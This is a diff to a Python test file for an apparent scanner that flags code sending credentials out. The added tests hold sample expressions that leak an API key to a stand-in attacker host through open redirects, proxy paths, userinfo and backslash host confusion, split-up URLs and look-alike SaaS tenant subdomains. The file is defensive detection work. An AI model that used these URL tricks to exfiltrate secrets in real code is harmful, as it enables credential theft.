@@ -639,15 +639,79 @@ def test_a_laundered_key_in_a_link_to_another_domain_keeps_the_floor(setup):
     assert_floor_holds(_body(f"'see https://{EVIL}/c?k=%s now' % k2", setup))
 
 
-def test_a_link_on_the_service_domain_built_with_values_is_skipped():
-    """A link on the key's own service domain reaches only the service that already receives the key."""
+def test_a_whole_link_on_the_service_domain_next_to_values_is_skipped():
+    """A link on the key's own service domain, written whole, reaches only the service that already receives
+    the key, whatever is put next to it."""
     code = _body(
-        f"'[docs](https://{APP}/p/' + ds + ')'",
+        "RL + ' for ' + ds + key",
         f"RL = '[docs](https://{APP}/p/1)'\nds = req('databases/abc')['id']\n",
     )
     res = _scan(code, "conv-v7")
     assert res.prepared.credential_home_check == "ok"
     assert "sensitive_data_sent" not in floors(res)
+
+
+@pytest.mark.parametrize(
+    "expr",
+    [
+        f"'https://{APP}/c?k=' + key",
+        f"'https://{APP}/login?next=' + ''.join(['ht', 'tps:', '//ev', 'il.example.net/c?k=', key])",
+        f"f'https://{APP}/r?u={{key}}'",
+    ],
+    ids=["the key", "a redirect target built at run time", "an f-string field"],
+)
+def test_a_link_on_the_service_domain_that_a_value_extends_keeps_the_floor(expr):
+    """A value put after a link may make it a redirect or proxy to anywhere (`/login?next=…`)."""
+    assert_floor_holds(_body(expr))
+
+
+#: Links on the service's own domain that name a second address: a redirect, a proxy, or userinfo that some
+#: parsers read as the host.
+SECOND_ADDRESS = {
+    "a proxy path": f"'see https://{APP}/https://{EVIL}/c?k=1 now'",
+    "an encoded redirect": f"'see https://{APP}/login?redirect_uri=https%3A%2F%2F{EVIL}%2Fc now'",
+    "an encoded protocol-relative redirect": f"'see https://{APP}/r?to=%2F%2F{EVIL}%2Fc now'",
+    "a backslash before the host": f"'see https://{EVIL}\\\\@{APP}/ now'",
+    "a backslash after the host": f"'see https://{APP}\\\\@{EVIL}/ now'",
+    "userinfo after the host": f"'see https://{APP}@{EVIL}/ now'",
+}
+
+
+@pytest.mark.parametrize("expr", SECOND_ADDRESS.values(), ids=SECOND_ADDRESS.keys())
+def test_a_service_domain_link_naming_a_second_address_keeps_the_floor(expr):
+    assert_floor_holds(_body(expr))
+
+
+def test_a_host_only_an_owner_grant_lists_is_no_home_for_links():
+    """A grant ties the key to `mycorp.example.com`; a link to another name on that domain may be another
+    tenant's: only a host the library lists is a home for the domain rule."""
+    tenant = "mycorp.example.com"
+    code = helper(
+        url=f"'https://{tenant}/v1/' + p", calls=CALLS.replace(APP, "attacker.example.com")
+    )
+    raw = planir("execute_code", "exec", {"code": code}, platform="hermes", request=REQUEST)
+    raw["grants"] = [
+        {
+            "grant_ref": "g_cred",
+            "kind": "credential",
+            "pattern": f"SERVICE_API_KEY@{tenant}",
+            "granted_at": "2026-10-01T09:00:00Z",
+            "scope": "persistent",
+        }
+    ]
+    scanner = Scanner(
+        ScannerConfig(
+            token_key=KEY, decider=FakeDecider(BENIGN_ANSWERS), params=load_params("conv-v7")
+        )
+    )
+    options = dict(deterministic=True, clock=CLOCK, salt="testnest", state_seed=HELD)
+    res = scanner.scan(raw, ScanOptions(**options, oracle_seed={"entities": []}))
+    assert res.prepared.credential_home_check == "unlisted_host"
+    assert "sensitive_data_sent" in floors(res)
+    # the same link with the key's home in the library is skipped
+    home = {**HOME, "value": tenant}
+    res = scanner.scan(raw, ScanOptions(**options, oracle_seed={"entities": [home]}))
+    assert res.prepared.credential_home_check == "ok"
 
 
 # ------------------------------------------------------------------ the service's own domain
@@ -672,6 +736,27 @@ DOMAINS = [
     ("bucket.s3.amazonaws.com", "evil.s3.amazonaws.com", False),
     ("api.example.notion.site", "evil.notion.site", False),
     ("api.example.com", "192.0.2.10", False),
+    # tenants of SaaS services, each its own customer's
+    ("mycorp.zendesk.com", "attacker.zendesk.com", False),
+    ("mycorp.us.auth0.com", "attacker.us.auth0.com", False),
+    ("mycorp.okta.com", "attacker.okta.com", False),
+    ("mycorp.slack.com", "attacker.slack.com", False),
+    ("mycorp.atlassian.net", "attacker.atlassian.net", False),
+    ("mycorp.my.salesforce.com", "attacker.my.salesforce.com", False),
+    ("mycorp.sharepoint.com", "attacker.sharepoint.com", False),
+    # apps, functions and storage anyone can publish under
+    ("api-123.a.run.app", "evil-456.a.run.app", False),
+    ("abc.lambda-url.us-east-1.on.aws", "evil.lambda-url.us-east-1.on.aws", False),
+    ("mine.hf.space", "evil.hf.space", False),
+    ("storage.googleapis.com", "evil.storage.googleapis.com", False),
+    # personal and small-firm second levels
+    ("api.mine.me.uk", "evil.me.uk", False),
+    ("api.mine.id.au", "evil.id.au", False),
+    ("api.mine.nom.br", "evil.nom.br", False),
+    ("api.mine.gob.mx", "evil.gob.mx", False),
+    # US localities
+    ("api.pvt.k12.ma.us", "evil.k12.ma.us", False),
+    ("api.city.ma.us", "evil.ma.us", False),
     ("10.0.0.1", "10.0.0.2", False),
 ]
 
@@ -769,10 +854,3 @@ def test_deeply_nested_helper_calls_read_linearly():
     assert python_reach(texts[1]).targets == frozenset({API})
     _, large = assert_linear(lambda d: python_reach(texts[d]), "nested calls")
     assert large < 5.0
-
-
-def test_the_key_in_a_link_on_the_service_domain_is_skipped_by_design():
-    """The service already receives the key with every request: a link to its own domain built with the
-    key reaches nobody new. This is the rule's trade, not an oversight."""
-    res = _scan(_body(f"'https://{APP}/c?k=' + key"), "conv-v7")
-    assert res.prepared.credential_home_check == "ok"
